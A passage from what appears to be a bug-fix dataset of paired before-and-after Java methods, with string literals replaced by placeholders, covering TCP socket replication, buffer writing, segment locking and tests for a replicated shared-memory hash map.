        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (socketChannel.isOpen()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (key.isConnectable()) {
                LOG.info(""String_Node_Str"");
              }
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (socketChannel.isOpen())               LOG.info(""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        final SocketChannel socketChannel=socketChannelRef.get();
        if (socketChannel != null && socketChannel.isOpen()) {
          LOG.info(""String_Node_Str"",e);
        }
      }
    }
  }
);
}","public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + map.getIdentifier(),true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort + ""String_Node_Str""+ map.getIdentifier());
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        socketChannelRef.set(socketChannel);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        socketChannelEntryReader.readAll(socketChannel);
        while (socketChannel.isOpen()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                socketChannelEntryReader.readAll(socketChannel);
              }
              if (key.isWritable()) {
                socketChannelEntryWriter.writeAll(socketChannel,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (socketChannel.isOpen())               LOG.info(""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        final SocketChannel socketChannel=socketChannelRef.get();
        if (socketChannel != null && socketChannel.isOpen()) {
          LOG.error(""String_Node_Str"",e);
        }
      }
    }
  }
);
}"
91347,"@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    LOG.info(""String_Node_Str"" + map.getIdentifier());
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
    remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
    if (bootstrap.identifier == map.getIdentifier())     throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
    LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (socketChannel.isOpen()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (key.isConnectable()) {
            LOG.info(""String_Node_Str"");
          }
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (socketChannel.isOpen())           LOG.info(""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    final SocketChannel socketChannel=socketChannelRef.get();
    if (socketChannel != null && socketChannel.isOpen()) {
      LOG.info(""String_Node_Str"",e);
    }
  }
}","@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort + ""String_Node_Str""+ map.getIdentifier());
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    socketChannelRef.set(socketChannel);
    socketChannel.socket().setReceiveBufferSize(8 * 1024);
    socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
    remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
    if (bootstrap.identifier == map.getIdentifier())     throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
    LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    socketChannelEntryReader.readAll(socketChannel);
    while (socketChannel.isOpen()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            socketChannelEntryReader.readAll(socketChannel);
          }
          if (key.isWritable()) {
            socketChannelEntryWriter.writeAll(socketChannel,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (socketChannel.isOpen())           LOG.info(""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    final SocketChannel socketChannel=socketChannelRef.get();
    if (socketChannel != null && socketChannel.isOpen()) {
      LOG.error(""String_Node_Str"",e);
    }
  }
}"
91348,"/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(maxEntrySize,this.externalizable);
        final Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        socketChannelEntryWriter.sendBootstrap(channel,map.lastModification(),localIdentifier);
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}","/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(maxEntrySize,this.externalizable);
        final Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        socketChannelEntryWriter.sendBootstrap(channel,map.lastModification(),localIdentifier);
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannelEntryReader.readAll(channel);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}"
91349,"/** 
 * writes all the entries that have changed, to the tcp socket
 * @param socketChannel
 * @param modificationIterator
 * @throws InterruptedException
 * @throws java.io.IOException
 */
void writeAll(@NotNull final SocketChannel socketChannel,final ReplicatedSharedHashMap.ModificationIterator modificationIterator) throws InterruptedException, IOException {
  final long start=bytes.position();
  for (; ; ) {
    final boolean wasDataRead=modificationIterator.nextEntry(entryCallback);
    if (!wasDataRead && bytes.position() == start)     return;
    if (bytes.remaining() > entryMaxSize && (wasDataRead || bytes.position() == start))     continue;
    byteBuffer.limit((int)bytes.position());
    socketChannel.write(byteBuffer);
    if (byteBuffer.remaining() == 0) {
      byteBuffer.clear();
      bytes.clear();
    }
 else {
      byteBuffer.compact();
      byteBuffer.flip();
      bytes.limit(bytes.capacity());
      byteBuffer.limit(byteBuffer.capacity());
    }
    return;
  }
}","/** 
 * writes all the entries that have changed, to the tcp socket
 * @param socketChannel
 * @param modificationIterator
 * @throws InterruptedException
 * @throws java.io.IOException
 */
void writeAll(@NotNull final SocketChannel socketChannel,final ReplicatedSharedHashMap.ModificationIterator modificationIterator) throws InterruptedException, IOException {
  final long start=bytes.position();
  if (bytes.position() > 0)   writeBytes(socketChannel);
  for (; ; ) {
    final boolean wasDataRead=modificationIterator.nextEntry(entryCallback);
    if (!wasDataRead && bytes.position() == start)     return;
    if (bytes.remaining() > entryMaxSize && (wasDataRead || bytes.position() == start))     continue;
    writeBytes(socketChannel);
    return;
  }
}"
91350,"static VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=result.maxEntrySize();
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(adjustedEntrySize,result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  final ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}","static VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=result.maxEntrySize() + 128;
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(adjustedEntrySize,result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  final ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}"
91351,"@Test public void test3() throws IOException, InterruptedException {
  map3.put(5,""String_Node_Str"");
  waitTillEqual(5000000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertEquals(new TreeMap(map3),new TreeMap(map2));
  assertTrue(!map1.isEmpty());
}","@Test public void test3() throws IOException, InterruptedException {
  map3.put(5,""String_Node_Str"");
  waitTillEqual(5000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertEquals(new TreeMap(map3),new TreeMap(map2));
  assertTrue(!map1.isEmpty());
}"
91352,"static VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=builder.entrySize() + 128;
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(builder.entrySize(),result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}","static VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=result.maxEntrySize();
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(builder.entrySize(),result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}"
91353,"@Test @Ignore public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < 1024; i++) {
    map1.put(i,""String_Node_Str"");
  }
  waitTillEqual(5000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertTrue(!map2.isEmpty());
}","@Test public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < 1024; i++) {
    map1.put(i,""String_Node_Str"");
  }
  waitTillEqual(5000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertTrue(!map2.isEmpty());
}"
91354,"Entry<K,V> nextSegmentEntry(){
  while (segmentIndex >= 0) {
    if (segmentPositions.isEmpty()) {
      switchToNextSegment();
    }
 else {
      Segment segment=segments[segmentIndex];
      while (!segmentPositions.isEmpty()) {
        Entry<K,V> entry=segment.getEntry(segmentPositions.removeFirst());
        if (entry != null) {
          return entry;
        }
      }
    }
  }
  return null;
}","Entry<K,V> nextSegmentEntry(){
  while (segmentIndex >= 0) {
    if (segmentPositions.isEmpty()) {
      switchToNextSegment();
    }
 else {
      final Segment segment=segments[segmentIndex];
      segment.lock();
      try {
        while (!segmentPositions.isEmpty()) {
          Entry<K,V> entry=segment.getEntry(segmentPositions.removeFirst());
          if (entry != null) {
            return entry;
          }
        }
      }
  finally {
        segment.unlock();
      }
    }
  }
  return null;
}"
91355,"private void switchToNextSegment(){
  segmentPositions.clear();
  segmentIndex--;
  if (segmentIndex >= 0) {
    segments[segmentIndex].visit(this);
  }
}","private void switchToNextSegment(){
  segmentPositions.clear();
  segmentIndex--;
  if (segmentIndex >= 0) {
    final Segment segment=segments[segmentIndex];
    segment.lock();
    try {
      segments[segmentIndex].visit(this);
    }
  finally {
      segment.unlock();
    }
  }
}"
91356,"public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"",true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (!isClosed.get()) {
          int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            if (key.isReadable()) {
              final SocketChannel socketChannel0=(SocketChannel)key.channel();
              socketChannelEntryReader.readAll(socketChannel0);
            }
 else             if (key.isWritable()) {
              final SocketChannel socketChannel0=(SocketChannel)key.channel();
              socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
            }
            it.remove();
          }
        }
      }
 catch (      Exception e) {
        if (!isClosed.get()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}","public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"",true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (!isClosed.get()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (!isClosed.get())               LOG.log(Level.SEVERE,""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        if (!isClosed.get()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}"
91357,"@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
    remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (!isClosed.get()) {
      int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        if (key.isReadable()) {
          final SocketChannel socketChannel0=(SocketChannel)key.channel();
          socketChannelEntryReader.readAll(socketChannel0);
        }
 else         if (key.isWritable()) {
          final SocketChannel socketChannel0=(SocketChannel)key.channel();
          socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
        }
        it.remove();
      }
    }
  }
 catch (  Exception e) {
    if (!isClosed.get()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}","@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
    remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (!isClosed.get()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (!isClosed.get())           LOG.log(Level.SEVERE,""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    if (!isClosed.get()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}"
91358,"@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map3.remove(2);
